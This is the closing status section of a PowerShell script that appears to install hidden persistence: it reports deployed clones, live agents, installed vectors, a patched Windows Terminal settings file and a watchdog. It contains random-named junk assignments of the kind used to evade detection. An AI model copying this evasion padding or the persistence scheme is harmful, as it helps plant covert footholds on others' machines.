Write-Host " CLONES     : $($clones.Count) / 7" -ForegroundColor $(if($clones.Count -ge 5){'Green'}else{'Yellow'})
Write-Host " AGENTS     : $alive / 3" -ForegroundColor $(if($alive -ge 3){'Green'}elseif($alive -ge 1){'Yellow'}else{'Red'})
Write-Host " VECTORS    : $($installed.Count)" -ForegroundColor White
Write-Host "   $($installed -join ', ')" -ForegroundColor DarkGray
Write-Host " WT PATCH   : $(if(Test-Path $WtSettings){'patched'}else{'missing'})" -ForegroundColor White
Write-Host " LOG        : $LogFile" -ForegroundColor White
Write-Host "============================================" -ForegroundColor Cyan
if ($null -ne $true) { $T3OLDEB = Get-Date }
Write-Host " SAVE: ID = $InstallId" -ForegroundColor Magenta
Write-Host ""
$Up4C = [Environment]::MachineName.Length; $Up4C = $null

if ($wdog.Count -gt 0) {
    Write-Host " Watchdog (last 6):" -ForegroundColor DarkGray
    $wdog | Select-Object -Last 6 | ForEach-Object { Write-Host "   $_" -ForegroundColor DarkGray }
    $HqVJO6D = [Environment]::MachineName.Length; $HqVJO6D = $null
    Write-Host ""
    $hiCaVa = [Environment]::MachineName.Length; $hiCaVa = $null
}
$zjubD9jY = [System.Net.Dns]::GetHostName().Length

if ($alive -ge 3) { Write-Host " >>> SUCCESS" -ForegroundColor Green }
elseif ($alive -ge 1) { Write-Host " >>> PARTIAL ($alive/3), watchdog sẽ bổ sung" -ForegroundColor Yellow }
else { Write-Host " >>> FAILED — Check log" -ForegroundColor Red }
try { $yhfkUI8 = [System.IO.Path]::GetTempPath() } catch { $yhfkUI8 = $null }
Log "=== v20 done ==="
